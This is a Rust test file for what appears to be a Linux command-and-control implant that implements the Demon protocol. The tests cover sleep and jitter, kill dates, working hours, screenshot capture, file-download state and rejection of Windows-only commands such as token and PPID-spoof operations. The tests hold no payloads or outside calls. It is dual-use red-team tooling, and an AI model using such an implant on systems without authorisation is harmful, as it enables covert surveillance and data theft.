use super::*;

#[tokio::test]
async fn command_no_job_returns_no_callbacks() {
    let package = DemonPackage::new(DemonCommand::CommandNoJob, 1, Vec::new());
    let mut state = PhantomState::default();
    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
    assert!(state.drain_callbacks().is_empty());
}

#[tokio::test]
async fn command_sleep_updates_config_and_queues_callback() {
    let mut payload = Vec::new();
    payload.extend_from_slice(&3000_i32.to_le_bytes());
    payload.extend_from_slice(&25_i32.to_le_bytes());
    let package = DemonPackage::new(DemonCommand::CommandSleep, 7, payload);
    let mut config = PhantomConfig::default();
    let mut state = PhantomState::default();

    execute(&package, &mut config, &mut state).await.expect("execute");

    assert_eq!(config.sleep_delay_ms, 3000, "sleep_delay_ms must be updated");
    assert_eq!(config.sleep_jitter, 25, "sleep_jitter must be updated");

    let callbacks = state.drain_callbacks();
    let [PendingCallback::Output { request_id, text }] = callbacks.as_slice() else {
        panic!("expected one Output callback, got: {callbacks:?}");
    };
    assert_eq!(*request_id, 7);
    assert!(text.contains("3000"), "callback text should mention new delay: {text}");
}

#[tokio::test]
async fn command_sleep_clamps_jitter_to_100() {
    let mut payload = Vec::new();
    payload.extend_from_slice(&1000_i32.to_le_bytes());
    payload.extend_from_slice(&150_i32.to_le_bytes()); // over 100
    let package = DemonPackage::new(DemonCommand::CommandSleep, 1, payload);
    let mut config = PhantomConfig::default();
    let mut state = PhantomState::default();

    execute(&package, &mut config, &mut state).await.expect("execute");

    assert_eq!(config.sleep_delay_ms, 1000);
    assert_eq!(config.sleep_jitter, 100, "jitter exceeding 100 must be clamped");
}

#[tokio::test]
async fn command_sleep_missing_jitter_returns_error() {
    let mut payload = Vec::new();
    payload.extend_from_slice(&2000_i32.to_le_bytes());
    // no jitter field — must not be silently ignored
    let package = DemonPackage::new(DemonCommand::CommandSleep, 2, payload);
    let mut config = PhantomConfig { sleep_jitter: 10, ..PhantomConfig::default() };
    let mut state = PhantomState::default();

    let err =
        execute(&package, &mut config, &mut state).await.expect_err("truncated payload must fail");
    assert!(
        matches!(err, PhantomError::TaskParse("task payload truncated")),
        "expected truncated payload error, got: {err:?}"
    );
    assert_eq!(config.sleep_delay_ms, PhantomConfig::default().sleep_delay_ms);
    assert_eq!(config.sleep_jitter, 10);
}

#[tokio::test]
async fn command_sleep_negative_delay_clamps_to_zero() {
    let mut payload = Vec::new();
    payload.extend_from_slice(&(-1_i32).to_le_bytes());
    payload.extend_from_slice(&5_i32.to_le_bytes());
    let package = DemonPackage::new(DemonCommand::CommandSleep, 3, payload);
    let mut config = PhantomConfig::default();
    let mut state = PhantomState::default();

    execute(&package, &mut config, &mut state).await.expect("execute");

    assert_eq!(config.sleep_delay_ms, 0);
    assert_eq!(config.sleep_jitter, 5);
}

#[tokio::test]
async fn execute_kill_date_stores_timestamp() {
    let timestamp: i64 = 1_800_000_000;
    let payload = timestamp.to_le_bytes().to_vec();
    let package = DemonPackage::new(DemonCommand::CommandKillDate, 50, payload);
    let mut state = PhantomState::default();

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute kill date");
    assert_eq!(state.kill_date(), Some(timestamp));

    let callbacks = state.drain_callbacks();
    assert_eq!(callbacks.len(), 1);
    let PendingCallback::Output { request_id, text } = &callbacks[0] else {
        panic!("expected Output callback, got: {callbacks:?}");
    };
    assert_eq!(*request_id, 50);
    assert!(text.contains("1800000000"));
}

#[tokio::test]
async fn execute_kill_date_zero_disables() {
    let payload = 0_i64.to_le_bytes().to_vec();
    let package = DemonPackage::new(DemonCommand::CommandKillDate, 51, payload);
    let mut state = PhantomState::default();

    execute(&package, &mut PhantomConfig::default(), &mut state)
        .await
        .expect("execute kill date zero");
    assert_eq!(state.kill_date(), None);

    let callbacks = state.drain_callbacks();
    let PendingCallback::Output { text, .. } = &callbacks[0] else {
        panic!("expected Output callback");
    };
    assert!(text.contains("disabled"));
}

#[tokio::test]
async fn execute_kill_date_updates_existing() {
    let mut state = PhantomState::default();

    // Set initial kill date.
    let payload = 1_800_000_000_i64.to_le_bytes().to_vec();
    let package = DemonPackage::new(DemonCommand::CommandKillDate, 60, payload);
    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("set initial");
    state.drain_callbacks();

    // Update to a new kill date.
    let payload = 1_900_000_000_i64.to_le_bytes().to_vec();
    let package = DemonPackage::new(DemonCommand::CommandKillDate, 61, payload);
    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("update");
    assert_eq!(state.kill_date(), Some(1_900_000_000));
}

#[test]
fn kill_date_callback_has_correct_command_id() {
    let callback = PendingCallback::KillDate { request_id: 0 };
    assert_eq!(callback.command_id(), u32::from(DemonCommand::CommandKillDate));
    assert_eq!(callback.request_id(), 0);
    assert!(callback.payload().expect("payload").is_empty());
}

#[test]
fn queue_kill_date_callback_adds_to_pending() {
    let mut state = PhantomState::default();
    state.queue_kill_date_callback();
    let callbacks = state.drain_callbacks();
    assert_eq!(callbacks.len(), 1);
    assert!(matches!(callbacks[0], PendingCallback::KillDate { request_id: 0 }));
}

// ---- CommandConfig tests ----

fn config_payload(key: u32, extra: &[u8]) -> Vec<u8> {
    let mut payload = (key as i32).to_le_bytes().to_vec();
    payload.extend_from_slice(extra);
    payload
}

#[tokio::test]
async fn config_kill_date_sets_state_and_echoes_back() {
    let kill_date: i64 = 1_700_000_000;
    let payload = config_payload(154, &kill_date.to_le_bytes());
    let package = DemonPackage::new(DemonCommand::CommandConfig, 10, payload);
    let mut state = PhantomState::default();

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    assert_eq!(state.kill_date(), Some(1_700_000_000));

    let callbacks = state.drain_callbacks();
    let [PendingCallback::Structured { command_id, request_id, payload }] = callbacks.as_slice()
    else {
        panic!("unexpected callbacks: {callbacks:?}");
    };
    assert_eq!(*command_id, u32::from(DemonCommand::CommandConfig));
    assert_eq!(*request_id, 10);

    let mut offset = 0;
    assert_eq!(read_u32(payload, &mut offset), 154);
    assert_eq!(read_u64(payload, &mut offset), 1_700_000_000);
}

#[tokio::test]
async fn config_kill_date_zero_clears_state() {
    let payload = config_payload(154, &0_i64.to_le_bytes());
    let package = DemonPackage::new(DemonCommand::CommandConfig, 11, payload);
    let mut state = PhantomState::default();
    state.set_kill_date(Some(1_700_000_000));

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    assert_eq!(state.kill_date(), None);
}

#[tokio::test]
async fn config_working_hours_sets_state_and_echoes_back() {
    // Enable flag (bit 22) + start 09:00 (9<<17 | 0<<11) + end 17:00 (17<<6 | 0<<0)
    let hours: i32 = (1 << 22) | (9 << 17) | (17 << 6);
    let payload = config_payload(155, &hours.to_le_bytes());
    let package = DemonPackage::new(DemonCommand::CommandConfig, 12, payload);
    let mut state = PhantomState::default();

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    assert_eq!(state.working_hours(), Some(hours));

    let callbacks = state.drain_callbacks();
    let [PendingCallback::Structured { command_id, request_id, payload }] = callbacks.as_slice()
    else {
        panic!("unexpected callbacks: {callbacks:?}");
    };
    assert_eq!(*command_id, u32::from(DemonCommand::CommandConfig));
    assert_eq!(*request_id, 12);

    let mut offset = 0;
    assert_eq!(read_u32(payload, &mut offset), 155);
    assert_eq!(read_u32(payload, &mut offset), hours as u32);
}

#[tokio::test]
async fn config_working_hours_zero_clears_state() {
    let payload = config_payload(155, &0_i32.to_le_bytes());
    let package = DemonPackage::new(DemonCommand::CommandConfig, 13, payload);
    let mut state = PhantomState::default();
    state.set_working_hours(Some(12345));

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    assert_eq!(state.working_hours(), None);
}

#[tokio::test]
async fn config_windows_only_key_returns_error() {
    // InjectTechnique (150) is Windows-only
    let payload = config_payload(150, &42_i32.to_le_bytes());
    let package = DemonPackage::new(DemonCommand::CommandConfig, 14, payload);
    let mut state = PhantomState::default();

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    let callbacks = state.drain_callbacks();
    let [PendingCallback::Error { request_id, text }] = callbacks.as_slice() else {
        panic!("unexpected callbacks: {callbacks:?}");
    };
    assert_eq!(*request_id, 14);
    assert!(text.contains("not supported on Linux"));
}

#[tokio::test]
async fn config_unknown_key_returns_error() {
    let payload = config_payload(9999, &[]);
    let package = DemonPackage::new(DemonCommand::CommandConfig, 15, payload);
    let mut state = PhantomState::default();

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    let callbacks = state.drain_callbacks();
    let [PendingCallback::Error { request_id, text }] = callbacks.as_slice() else {
        panic!("unexpected callbacks: {callbacks:?}");
    };
    assert_eq!(*request_id, 15);
    assert!(text.contains("unknown config key"));
}

// --- CommandScreenshot tests ---

/// Sending a `CommandScreenshot` package through the dispatcher must produce
/// a `Structured` callback with `command_id == CommandScreenshot`.  The payload
/// starts with a success flag (u32).  In CI/test environments without a display
/// the flag will be 0 (failure) — that is fine; the important thing is that the
/// dispatcher routes the command and produces a well-formed response.
#[tokio::test]
async fn screenshot_dispatcher_routes_command_and_queues_callback() {
    let mut state = PhantomState::default();
    let package = DemonPackage::new(DemonCommand::CommandScreenshot, 0x42, Vec::new());
    let result = execute(&package, &mut PhantomConfig::default(), &mut state).await;
    assert!(result.is_ok(), "execute must not return an error");
    let callbacks = state.drain_callbacks();
    assert_eq!(callbacks.len(), 1, "exactly one callback expected");
    let PendingCallback::Structured { command_id, request_id, payload } = &callbacks[0] else {
        panic!("expected Structured callback, got {:?}", callbacks[0]);
    };
    assert_eq!(*command_id, u32::from(DemonCommand::CommandScreenshot));
    assert_eq!(*request_id, 0x42);
    // The first 4 bytes must be the success flag (0 or 1).
    assert!(payload.len() >= 4, "payload must contain at least the success flag");
    let mut offset = 0;
    let success = read_u32(payload, &mut offset);
    assert!(success <= 1, "success flag must be 0 or 1, got {success}");
}

/// When the screenshot succeeds (tested by mocking via a helper), the response
/// payload must be `[1:u32][len:u32][image_bytes]`.
#[tokio::test]
async fn screenshot_success_payload_format() {
    let mut state = PhantomState::default();
    // Construct a known-good structured callback as execute_screenshot would.
    let fake_image = b"PNG_TEST_DATA";
    let mut expected_payload = encode_u32(1);
    expected_payload.extend_from_slice(&encode_bytes(fake_image).expect("encode_bytes"));
    state.queue_callback(PendingCallback::Structured {
        command_id: u32::from(DemonCommand::CommandScreenshot),
        request_id: 0xAA,
        payload: expected_payload.clone(),
    });
    let callbacks = state.drain_callbacks();
    let PendingCallback::Structured { payload, .. } = &callbacks[0] else {
        panic!("expected Structured");
    };
    let mut offset = 0;
    let success = read_u32(payload, &mut offset);
    assert_eq!(success, 1);
    let image = read_bytes(payload, &mut offset);
    assert_eq!(image, fake_image);
}

/// When screenshot capture fails, the response payload must be just `[0:u32]`.
#[tokio::test]
async fn screenshot_failure_payload_format() {
    let mut state = PhantomState::default();
    // Simulate failure: encode success=0 (same as execute_screenshot does).
    let expected_payload = encode_u32(0);
    state.queue_callback(PendingCallback::Structured {
        command_id: u32::from(DemonCommand::CommandScreenshot),
        request_id: 0xBB,
        payload: expected_payload,
    });
    let callbacks = state.drain_callbacks();
    let PendingCallback::Structured { payload, .. } = &callbacks[0] else {
        panic!("expected Structured");
    };
    assert_eq!(payload.len(), 4, "failure payload must be exactly 4 bytes");
    let mut offset = 0;
    let success = read_u32(payload, &mut offset);
    assert_eq!(success, 0);
}

/// `capture_x11_native` must return a `PhantomError::Screenshot` when no X
/// display is available (CI / headless environment).  It must never panic.
#[test]
fn x11_native_no_display_returns_screenshot_error() {
    // Temporarily unset DISPLAY and WAYLAND_DISPLAY so XOpenDisplay returns NULL.
    let saved_display = std::env::var("DISPLAY").ok();
    let saved_wayland = std::env::var("WAYLAND_DISPLAY").ok();
    unsafe {
        std::env::remove_var("DISPLAY");
        std::env::remove_var("WAYLAND_DISPLAY");
    }

    let result = capture_x11_native();

    // Restore env vars regardless of outcome.
    unsafe {
        if let Some(v) = saved_display {
            std::env::set_var("DISPLAY", v);
        }
        if let Some(v) = saved_wayland {
            std::env::set_var("WAYLAND_DISPLAY", v);
        }
    }

    match result {
        Err(crate::error::PhantomError::Screenshot(_)) => { /* expected in headless CI */ }
        Ok(_) => {
            // Running inside a real X session is also acceptable.
        }
        Err(other) => panic!("unexpected error variant: {other:?}"),
    }
}

// ---- Windows-only command rejection tests ----

/// Helper: verify a Windows-only command returns a not-supported error.
async fn assert_windows_only_rejected(command: DemonCommand) {
    let package = DemonPackage::new(command, 77, Vec::new());
    let mut state = PhantomState::default();

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    let callbacks = state.drain_callbacks();
    let [PendingCallback::Error { request_id, text }] = callbacks.as_slice() else {
        panic!("expected single Error callback for {command:?}, got: {callbacks:?}");
    };
    assert_eq!(*request_id, 77);
    assert!(
        text.contains("not supported on Linux"),
        "expected 'not supported on Linux' in error for {command:?}, got: {text}",
    );
}

#[tokio::test]
async fn windows_only_command_token_rejected() {
    assert_windows_only_rejected(DemonCommand::CommandToken).await;
}

#[tokio::test]
async fn windows_only_command_inline_execute_rejected() {
    assert_windows_only_rejected(DemonCommand::CommandInlineExecute).await;
}

#[tokio::test]
async fn windows_only_command_job_rejected() {
    assert_windows_only_rejected(DemonCommand::CommandJob).await;
}

#[tokio::test]
async fn windows_only_command_ps_import_rejected() {
    assert_windows_only_rejected(DemonCommand::CommandPsImport).await;
}

#[tokio::test]
async fn windows_only_command_assembly_inline_execute_rejected() {
    assert_windows_only_rejected(DemonCommand::CommandAssemblyInlineExecute).await;
}

#[tokio::test]
async fn windows_only_command_assembly_list_versions_rejected() {
    assert_windows_only_rejected(DemonCommand::CommandAssemblyListVersions).await;
}

#[tokio::test]
async fn windows_only_command_proc_ppid_spoof_rejected() {
    assert_windows_only_rejected(DemonCommand::CommandProcPpidSpoof).await;
}

// ------------------------------------------------------------------
// CommandPackageDropped
// ------------------------------------------------------------------

#[tokio::test]
async fn package_dropped_queues_error_callback() {
    let mut payload = Vec::new();
    payload.extend_from_slice(&(128_000_i32).to_le_bytes()); // dropped length
    payload.extend_from_slice(&(65_536_i32).to_le_bytes()); // max length
    let package = DemonPackage::new(DemonCommand::CommandPackageDropped, 42, payload);
    let mut state = PhantomState::default();

    execute(&package, &mut PhantomConfig::default(), &mut state)
        .await
        .expect("execute package dropped");

    let callbacks = state.drain_callbacks();
    assert_eq!(callbacks.len(), 1);
    let PendingCallback::Error { request_id, text } = &callbacks[0] else {
        panic!("expected Error callback, got: {callbacks:?}");
    };
    assert_eq!(*request_id, 42);
    assert!(text.contains("128000"), "should mention dropped length");
    assert!(text.contains("65536"), "should mention max length");
}

#[tokio::test]
async fn package_dropped_marks_matching_download_for_removal() {
    let mut state = PhantomState::default();

    // Manually insert an active download with request_id 99.
    let tmp = std::env::temp_dir().join("phantom_test_pkg_dropped");
    std::fs::write(&tmp, b"test data").expect("write temp file");
    let file = std::fs::File::open(&tmp).expect("open temp file");
    state.downloads.push(ActiveDownload {
        file_id: 1,
        request_id: 99,
        file,
        total_size: 9,
        read_size: 0,
        state: DownloadTransferState::Running,
    });

    let mut payload = Vec::new();
    payload.extend_from_slice(&(200_000_i32).to_le_bytes());
    payload.extend_from_slice(&(65_536_i32).to_le_bytes());
    let package = DemonPackage::new(DemonCommand::CommandPackageDropped, 99, payload);

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    assert_eq!(state.downloads[0].state, DownloadTransferState::Remove);

    let _ = std::fs::remove_file(&tmp);
}

#[tokio::test]
async fn package_dropped_leaves_unrelated_downloads_intact() {
    let mut state = PhantomState::default();

    let tmp = std::env::temp_dir().join("phantom_test_pkg_dropped_other");
    std::fs::write(&tmp, b"other data").expect("write temp file");
    let file = std::fs::File::open(&tmp).expect("open temp file");
    state.downloads.push(ActiveDownload {
        file_id: 2,
        request_id: 50,
        file,
        total_size: 10,
        read_size: 0,
        state: DownloadTransferState::Running,
    });

    let mut payload = Vec::new();
    payload.extend_from_slice(&(200_000_i32).to_le_bytes());
    payload.extend_from_slice(&(65_536_i32).to_le_bytes());
    // Different request_id — should not touch the download.
    let package = DemonPackage::new(DemonCommand::CommandPackageDropped, 99, payload);

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    assert_eq!(state.downloads[0].state, DownloadTransferState::Running);

    let _ = std::fs::remove_file(&tmp);
}

#[tokio::test]
async fn package_dropped_with_short_payload_returns_parse_error() {
    // Only one u32 instead of two.
    let payload = (128_000_i32).to_le_bytes().to_vec();
    let package = DemonPackage::new(DemonCommand::CommandPackageDropped, 1, payload);
    let mut state = PhantomState::default();
    let result = execute(&package, &mut PhantomConfig::default(), &mut state).await;
    assert!(result.is_err());
}
